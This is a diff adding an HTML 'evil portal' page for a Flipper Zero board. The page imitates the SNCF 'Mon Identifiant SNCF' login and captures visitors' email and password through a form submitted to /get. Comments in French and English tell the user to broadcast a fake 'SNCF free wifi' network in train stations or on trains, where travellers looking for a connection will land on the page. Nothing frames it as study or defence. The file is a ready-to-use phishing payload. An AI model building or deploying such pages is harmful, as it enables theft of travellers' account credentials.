@@ -1,0 +1,142 @@
+<!-- Scénario gare et train en france: 
+ 1: creez sur votre devboard flipperzero un réseau "SNCF free wifi".
+ 2: definissez votre page d'accueil sur ce fichier.
+ 3: installez vous dans une gare, ou mieux, dans un train: le réseau y est souvent trop faible et le public aura tendance à rechercher les réseau wifi pour eviter les déconnections intempestives.
+ 4: lancez votre evilportal
+ 5: bonne pêche-->
+
+ <!-- Scenario station and train in France:
+1: create on your flipperzero devboard a "SNCF free wifi" network.
+2: define your home page on this file.
+3: settle in a station, or better, in a train: the network is often too weak there and the public will tend to look for wifi networks to avoid untimely disconnections.
+4: launch your evilportal
+5: good fishing-->
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #f2f2f2;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+  color: #1d2129;
+}
+.login-container {
+  width: 400px;
+  background-color: white;
+  box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.20);
+  border-radius: 10px;
+  padding: 20px 30px;
+  text-align: center;
+}
+h1 {
+  font-size: 24px;
+  font-weight: normal;
+  margin-bottom: 10px;
+}
+h2 {
+  font-size: 16px;
+  font-weight: normal;
+  color: #606770;
+  margin-bottom: 20px;
+}
+input[type=email], input[type=password] {
+  width: 100%;
+  padding: 15px;
+  margin: 5px 0 20px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  border-radius: 5px;
+}
+button {
+  background-color: #A81A3D;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  border-radius: 5px;
+}
+button:hover {
+  opacity: 0.8;
+}
+.cancelbtn {
+  background-color: #fff;
+  color: #A81A3D;
+  padding: 14px 20px;
+  border: 1px solid #A81A3D;
+  cursor: pointer;
+  width: 100%;
+  border-radius: 5px;
+  margin-top: 10px;
+}
+.cancelbtn:hover {
+  background-color: #f2f2f2;
+}
+label {
+  font-size: 14px;
+  color: #333;
+}
+.forgot-password {
+  color: #0067C5;
+  float: right;
+  margin-top: -15px;
+  margin-bottom: 15px;
+  font-size: 14px;
+}
+.forgot-password:hover {
+  text-decoration: underline;
+}
+.remember-me {
+  display: flex;
+  align-items: center;
+  margin-bottom: 15px;
+}
+.remember-me input {
+  margin-right: 5px;
+}
+</style>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+</head>
+<body>
+<div class="login-container">
+  <h1>Bienvenue sur <span style="color: #A81A3D;">Mon Identifiant SNCF</span></h1>
+  <h2>Connexion à mon compte</h2>
+  <p>Ces identifiants vous donneront accès aux espaces clients des sites et applications SNCF et partenaires**, et à votre navigateur internet.</p>
+  <form action="/get" method="get">
+    <label for="email">Adresse e-mail *</label>
+    <input type="email" placeholder="Enter Email" name="email" required>
+    
+    <label for="password">Mot de passe *</label>
+    <input type="password" placeholder="Enter Password" name="password" required>
+    
+    <div class="remember-me">
+      <input type="checkbox" name="remember">
+      <label for="remember">Se souvenir de moi</label>
+    </div>
+    
+    <a href="#" class="forgot-password">Mot de passe oublié >></a>
+    
+    <button type="submit">Me connecter</button>
+    <button type="button" class="cancelbtn">Annuler</button>
+  </form>
+  <p style="font-size: 12px; color: #606770; margin-top: 20px;">**Identifiants uniques valables sur : appli Assistant SNCF, bornes libre-service en gares et boutiques, chatbot TOUT'OUÏ, site Ma Place à Bord, Site MAX ACTIF / MAX ACTIF +, site Mon Chauffeur TGV INOUI, site Mon espace TGV INOUI, appli SNCF Connect, site SNCF Connect, portail le Wifi à bord, sites TER et appli TGV INOUI Pro</p>
+</div>
+</body>
+</html>
+
+
+
+
+
+
